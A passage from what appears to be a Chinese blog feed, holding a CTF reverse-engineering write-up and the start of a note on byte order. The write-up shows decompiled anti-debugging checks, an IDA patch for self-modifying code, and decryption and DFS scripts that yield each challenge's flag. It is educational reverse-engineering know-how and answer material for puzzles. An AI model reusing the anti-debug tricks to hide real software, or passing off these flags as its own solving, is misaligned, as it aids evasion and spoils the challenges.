*a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// [rsp+438h] [rbp+3B8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a2;</span><br><span class="line">  GetWindowTextA(a1, (LPSTR)&amp;v3 + <span class="number">32</span>, <span class="number">1023</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;WinDbg&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;IDA&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;x64_dbg&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;OllyICE&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;OllyDBG&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(&amp;String, <span class="string">&quot;Immunity&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调试过程中还发现SMC(代码自修改), 用IDA脚本patch一下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">xor = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;Caucasus@s_ability&quot;</span>)</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="built_in">ord</span>, ida_bytes.get_bytes(<span class="number">0x00000010040164D</span>, <span class="number">1045</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line">    buf[i] ^= xor[i % <span class="number">18</span>]</span><br><span class="line">ida_bytes.patch_bytes(<span class="number">0x00000010040164D</span>, <span class="built_in">str</span>(<span class="built_in">bytearray</span>(buf)))</span><br></pre></td></tr></table></figure><p>得到函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10040164D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">74</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">8</span>]; <span class="comment">// [rsp+6Ah] [rbp-16h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+7Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">4</span>]; <span class="comment">// [rsp+7Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+A0h] [rbp+20h]</span></span><br><span class="line">  <span class="keyword">char</span> Format[<span class="number">8</span>]; <span class="comment">// [rsp+D0h] [rbp+50h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+110h] [rbp+90h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+114h] [rbp+94h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+118h] [rbp+98h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+11Ch] [rbp+9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+120h] [rbp+A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+124h] [rbp+A4h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+128h] [rbp+A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+12Ch] [rbp+ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+130h] [rbp+B0h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+134h] [rbp+B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+138h] [rbp+B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+140h] [rbp+C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+144h] [rbp+C4h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+148h] [rbp+C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+14Ch] [rbp+CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+150h] [rbp+D0h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+154h] [rbp+D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [rsp+158h] [rbp+D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+15Ch] [rbp+DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+160h] [rbp+E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+164h] [rbp+E4h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+168h] [rbp+E8h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+16Ch] [rbp+ECh]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+170h] [rbp+F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [rsp+174h] [rbp+F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [rsp+178h] [rbp+F8h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [rsp+17Ch] [rbp+FCh]</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [rsp+180h] [rbp+100h]</span></span><br><span class="line">  <span class="keyword">int</span> v38; <span class="comment">// [rsp+184h] [rbp+104h]</span></span><br><span class="line">  <span class="keyword">int</span> v39; <span class="comment">// [rsp+188h] [rbp+108h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [rsp+18Ch] [rbp+10Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [rsp+190h] [rbp+110h]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [rsp+194h] [rbp+114h]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [rsp+198h] [rbp+118h]</span></span><br><span class="line">  <span class="keyword">int</span> v44; <span class="comment">// [rsp+19Ch] [rbp+11Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+1A0h] [rbp+120h]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [rsp+1A4h] [rbp+124h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [rsp+1A8h] [rbp+128h]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [rsp+1ACh] [rbp+12Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v49; <span class="comment">// [rsp+1B0h] [rbp+130h]</span></span><br><span class="line">  <span class="keyword">int</span> v50; <span class="comment">// [rsp+1B4h] [rbp+134h]</span></span><br><span class="line">  <span class="keyword">int</span> v51; <span class="comment">// [rsp+1B8h] [rbp+138h]</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [rsp+1BCh] [rbp+13Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [rsp+1C0h] [rbp+140h]</span></span><br><span class="line">  <span class="keyword">int</span> v54; <span class="comment">// [rsp+1C4h] [rbp+144h]</span></span><br><span class="line">  <span class="keyword">int</span> v55; <span class="comment">// [rsp+1C8h] [rbp+148h]</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [rsp+1CCh] [rbp+14Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v57; <span class="comment">// [rsp+1D0h] [rbp+150h]</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [rsp+1D4h] [rbp+154h]</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [rsp+1D8h] [rbp+158h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v60; <span class="comment">// [rsp+1E0h] [rbp+160h]</span></span><br><span class="line">  <span class="keyword">int</span> v61; <span class="comment">// [rsp+1E4h] [rbp+164h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v62; <span class="comment">// [rsp+1E8h] [rbp+168h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1ECh] [rbp+16Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">2007666</span>;</span><br><span class="line">  v10 = <span class="number">2125764</span>;</span><br><span class="line">  v11 = <span class="number">1909251</span>;</span><br><span class="line">  v12 = <span class="number">2027349</span>;</span><br><span class="line">  v13 = <span class="number">2421009</span>;</span><br><span class="line">  v14 = <span class="number">1653372</span>;</span><br><span class="line">  v15 = <span class="number">2047032</span>;</span><br><span class="line">  v16 = <span class="number">2184813</span>;</span><br><span class="line">  v17 = <span class="number">2302911</span>;</span><br><span class="line">  v18 = <span class="number">2263545</span>;</span><br><span class="line">  v19 = <span class="number">1909251</span>;</span><br><span class="line">  v20 = <span class="number">2165130</span>;</span><br><span class="line">  v21 = <span class="number">1968300</span>;</span><br><span class="line">  v22 = <span class="number">2243862</span>;</span><br><span class="line">  v23 = <span class="number">2066715</span>;</span><br><span class="line">  v24 = <span class="number">2322594</span>;</span><br><span class="line">  v25 = <span class="number">1987983</span>;</span><br><span class="line">  v26 = <span class="number">2243862</span>;</span><br><span class="line">  v27 = <span class="number">1869885</span>;</span><br><span class="line">  v28 = <span class="number">2066715</span>;</span><br><span class="line">  v29 = <span class="number">2263545</span>;</span><br><span class="line">  v30 = <span class="number">1869885</span>;</span><br><span class="line">  v31 = <span class="number">964467</span>;</span><br><span class="line">  v32 = <span class="number">944784</span>;</span><br><span class="line">  v33 = <span class="number">944784</span>;</span><br><span class="line">  v34 = <span class="number">944784</span>;</span><br><span class="line">  v35 = <span class="number">728271</span>;</span><br><span class="line">  v36 = <span class="number">1869885</span>;</span><br><span class="line">  v37 = <span class="number">2263545</span>;</span><br><span class="line">  v38 = <span class="number">2283228</span>;</span><br><span class="line">  v39 = <span class="number">2243862</span>;</span><br><span class="line">  v40 = <span class="number">2184813</span>;</span><br><span class="line">  v41 = <span class="number">2165130</span>;</span><br><span class="line">  v42 = <span class="number">2027349</span>;</span><br><span class="line">  v43 = <span class="number">1987983</span>;</span><br><span class="line">  v44 = <span class="number">2243862</span>;</span><br><span class="line">  v45 = <span class="number">1869885</span>;</span><br><span class="line">  v46 = <span class="number">2283228</span>;</span><br><span class="line">  v47 = <span class="number">2047032</span>;</span><br><span class="line">  v48 = <span class="number">1909251</span>;</span><br><span class="line">  v49 = <span class="number">2165130</span>;</span><br><span class="line">  v50 = <span class="number">1869885</span>;</span><br><span class="line">  v51 = <span class="number">2401326</span>;</span><br><span class="line">  v52 = <span class="number">1987983</span>;</span><br><span class="line">  v53 = <span class="number">2243862</span>;</span><br><span class="line">  v54 = <span class="number">2184813</span>;</span><br><span class="line">  v55 = <span class="number">885735</span>;</span><br><span class="line">  v56 = <span class="number">2184813</span>;</span><br><span class="line">  v57 = <span class="number">2165130</span>;</span><br><span class="line">  v58 = <span class="number">1987983</span>;</span><br><span class="line">  v59 = <span class="number">2460375</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(Format, <span class="string">&quot;Input the flag to hijack the ability of Hiden Intelligence:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;Progrise Key confirmed. Ready to break.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;Jacking Break! Zaia Enterprise.&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;%59s&quot;</span>);</span><br><span class="line">  v3 = <span class="number">29477</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;Not verified!&quot;</span>);</span><br><span class="line">  v62 = <span class="number">-2147483637</span>;</span><br><span class="line">  <span class="built_in">printf</span>(Format);</span><br><span class="line">  <span class="built_in">scanf</span>(v5, Str);</span><br><span class="line">  <span class="built_in">printf</span>(v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">51</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(v2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v61 = <span class="number">19683</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v60 = v61 * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)Str[i] % v62;</span><br><span class="line">    <span class="keyword">if</span> ( v60 != *(&amp;v9 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(v2);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(v6);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密比较简单:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">res = [<span class="number">0x1EA272</span>, <span class="number">0x206FC4</span>, <span class="number">0x1D2203</span>, <span class="number">0x1EEF55</span>, <span class="number">2421009</span>, <span class="number">0x193A7C</span>, <span class="number">0x1F3C38</span>, <span class="number">2184813</span>, <span class="number">2302911</span>, <span class="number">2263545</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1968300</span>, <span class="number">2243862</span>, <span class="number">2066715</span>, <span class="number">2322594</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2066715</span>, <span class="number">2263545</span>, <span class="number">1869885</span>, <span class="number">964467</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">728271</span>, <span class="number">1869885</span>, <span class="number">2263545</span>, <span class="number">2283228</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">2027349</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2283228</span>, <span class="number">2047032</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1869885</span>, <span class="number">2401326</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">885735</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">1987983</span>, <span class="number">2460375</span>]</span><br><span class="line"></span><br><span class="line">mul = <span class="number">19683</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">51</span>):</span><br><span class="line">    res[i] <span class="comment">//= mul</span></span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure><p>最终flag为:<br><code>flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</code></p><h2 id="fxck"><a href="#fxck" class="headerlink" title="fxck"></a>fxck</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x2B</span>uLL);</span><br><span class="line">  check_array = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, s);</span><br><span class="line">  input_len = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( input_len &lt;= <span class="number">42</span> &amp;&amp; input_len )</span><br><span class="line">  &#123;</span><br><span class="line">    operate(s, input_len, check_array);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(check_array) == <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>主逻辑为接受一个长度小于42的字符串对其进行操作后校验</p><p>在<code>check()</code>函数中由于<code>return strcmp(a4vyhutqrfyfnq8, check_array) == 0;</code>可以在调试过程中直接得到校验字符串为<code>4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe</code></p><p>操作过程为对输入进行base58加密, tab表为自修改后出现</p><p>最终解密脚本为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tab = <span class="string">b&#x27;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[::-<span class="number">1</span>]:</span><br><span class="line">        tmp += <span class="built_in">bytes</span>([tab.index(i)])</span><br><span class="line">    <span class="built_in">pow</span> = <span class="number">1</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        res += <span class="built_in">pow</span>*tmp[i]</span><br><span class="line">        <span class="built_in">pow</span> *= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(res)[:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b58decode(<span class="string">b&quot;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&quot;</span>))</span><br></pre></td></tr></table></figure><p>flag为:<code>flag&#123;63510cf7-2b80-45e1-a186-21234897e5cd&#125;</code></p><p>以下是Apeng大佬wp原话:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base58, 之后用brainfuck语言加密, 但是代码可能写错了, 每次加密的都是上一位的结果。修改之后的版本改为直接对比编码结果, 解base58即可。</span><br><span class="line"></span><br><span class="line">base58编码部分也有bug, 存放结果的位置没有初始化为0, 导致存放了一些垃圾数据, 体现在解密后为\x06开头。位数短的话这里会是\xE0。</span><br></pre></td></tr></table></figure><p>学到了0.0</p><h2 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h2><p>VM题, init和finit还有另外几部分虚拟机, 主要用于输出题目和初始化res数组, 加密比较简单:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = [<span class="number">0x90</span>, <span class="number">0x14C</span>, <span class="number">0x1C</span>, <span class="number">0xF0</span>, <span class="number">0x84</span>, <span class="number">0x3C</span>, <span class="number">0x18</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0x58</span>, <span class="number">0x2C</span>, <span class="number">0x8</span>, <span class="number">0x34</span>, <span class="number">0xF0</span>, <span class="number">0x114</span>, <span class="number">0xF0</span>, <span class="number">0x80</span>, <span class="number">0x2C</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x8</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x5C</span>, <span class="number">0x2C</span>, <span class="number">0x108</span>, <span class="number">0xF0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    res[i] &gt;&gt;= <span class="number">2</span></span><br><span class="line">    res[i] ^= <span class="number">0x63</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(res))</span><br></pre></td></tr></table></figure><p>flag:<code>flag&#123;G0d_Bless_Wuhan_&amp;_China_Growth!&#125;</code></p><h2 id="cyclegraph"><a href="#cyclegraph" class="headerlink" title="cyclegraph"></a>cyclegraph</h2><p>图算法, 用深搜和可见字符进行过滤爆破, 且题目对最后一位进行了校验, 避免多解:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># graph = [0x34, 0x0F13398, 0x0F1338C, 0x2, 0x0F13398, 0x0F133E0, 0x2C, 0x0F1338C, 0x0F133D4, 0x2A, 0x0F13458, 0x0F13494, 0x6, 0x0F133D4, 0x0F133EC, 0x2A, 0x0F13398, 0x0F13464, 0x2F, 0x0F134B8, 0x0F134F4, 0x2A, 0x0F1341C, 0x0F13494, 0x33, 0x0F133B0, 0x0F133EC, 0x3, 0x0F133F8, 0x0F1341C, 0x2, 0x0F133B0, 0x0F13410, 0x32, 0x0F1347C, 0x0F134DC, 0x32, 0x0F13428, 0x0F133F8, 0x32, 0x0F1338C, 0x0F134A0, 0x30, 0x0F13380, 0x0F133EC, 0x3, 0x0F13428, 0x0F134A0, 0x1, 0x0F133BC, 0x0F134AC, 0x32, 0x0F133D4, 0x0F133EC, 0x2B, 0x0F134D0, 0x0F134B8, 0x2, 0x0F13410, 0x0F133A4, 0x2E, 0x0F134D0, 0x0F13488, 0x1, 0x0F13434, 0x0F133C8, 0x2, 0x0F13434, 0x0F1344C, 0x2D, 0x0F13398, 0x0F1341C, 0x32, 0x0F13440, 0x0F133D4, 0x4, 0x0F13494, 0x0F13434, 0x2D, 0x0F134E8, 0x0F13470, 0x30, 0x0F13494, 0x0F1338C, 0x31, 0x0F13464, 0x0F13440, 0x2F, 0x0F133EC, 0x0F133B0, 0x33, 0x0F13488, 0x0F13404, 0x5, 0x0F134F4, 0x0F134F4]</span></span><br><span class="line"><span class="comment"># graph1 = []</span></span><br><span class="line"><span class="comment"># for i in graph:</span></span><br><span class="line"><span class="comment">#     if i &gt; 0x00F13380:</span></span><br><span class="line"><span class="comment">#         graph1.append((i - 0x0F13380) / 4)</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         graph1.append(i)</span></span><br><span class="line"><span class="comment"># print(graph1)</span></span><br><span class="line"><span class="comment"># 96</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x30</span></span><br><span class="line">graph = [<span class="number">52</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">44</span>, <span class="number">3</span>, <span class="number">21</span>, <span class="number">42</span>, <span class="number">54</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">78</span>, <span class="number">93</span>, <span class="number">42</span>, <span class="number">39</span>, <span class="number">69</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">36</span>, <span class="number">50</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">48</span>, <span class="number">15807360</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">84</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">36</span>, <span class="number">9</span>, <span class="number">46</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">69</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">90</span>, <span class="number">60</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">3</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">27</span>, <span class="number">12</span>, <span class="number">51</span>, <span class="number">66</span>, <span class="number">33</span>, <span class="number">5</span>, <span class="number">93</span>, <span class="number">93</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_@&quot;</span></span><br><span class="line"><span class="built_in">list</span> = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="built_in">list</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">index, i, flag, s</span>):</span></span><br><span class="line">    <span class="keyword">global</span> graph</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">if</span> graph[index] == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> s + graph[index] <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            dfs(graph[index + <span class="number">1</span>], i + <span class="number">1</span>, flag + <span class="built_in">chr</span>(s + graph[index]), s + graph[index])</span><br><span class="line">        <span class="keyword">if</span> s - graph[index] <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            dfs(graph[index + <span class="number">2</span>], i + <span class="number">1</span>, flag + <span class="built_in">chr</span>(s - graph[index]), s - graph[index])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, start)</span><br></pre></td></tr></table></figure><p>flag: <code>flag&#123;d8b0bc97a6c0ba27&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> SMC </tag>
            
            <tag> Base58 </tag>
            
            <tag> Brainfuck </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Big Endian and Little Endian</title>
      <link href="/note-binary-big-little-ending/"/>
      <url>/note-binary-big-little-ending/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>关于大端小端名词的由来, 有一个有趣的故事, 来自于Jonathan Swift的《格利佛游记》:Lilliput和Blefuscu这两个强国在过去的36个月中一直在苦战。战争的原因:大家都知道, 吃鸡蛋的时候, 原始的方法是打破鸡蛋较大的一端, 可以那时的皇帝的祖父由于小时侯吃鸡蛋, 按这种方法把手指弄破了, 因此他的父亲, 就下令, 命令所有的子民吃鸡蛋的时候, 必须先打破鸡蛋较小的一端, 违令者重罚。然后老百姓对此法令极为反感, 期间发生了多次叛乱, 其中一个皇帝因此送命, 另一个丢了王位, 产生叛乱的原因就是另一个国家Blefuscu的国王大臣煽动起来的, 叛乱平息后, 就逃到这个帝国避难。据估计, 先后几次有11000余人情愿死也不肯去打破鸡蛋较小的端吃鸡蛋。</p><p>这个其实讽刺当时英国和法国之间持续的冲突。</p><p>Danny Cohen, 一位网络协议的开创者, 第一次使用这两个术语指代字节顺序, 后来就被大家广泛接受。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ul><li><p>Little-Endian就是低位字节排放在内存的低地址端, 高位字节排放在内存的高地址端。</p></li><li><p>Big-Endian就是高位字节排放在内存的低地址端, 低位字节排放在内存的高地址端。</p></li></ul><p>举一个例子, 比如数字0x12 34 56 78在内存中的表示形式为:</p><ul><li>大端模式:</li></ul><table><thead><tr><th>低地址</th><th align="left"></th><th></th><th>高地址</th></tr></thead><tbody><tr><td>0x12</td><td 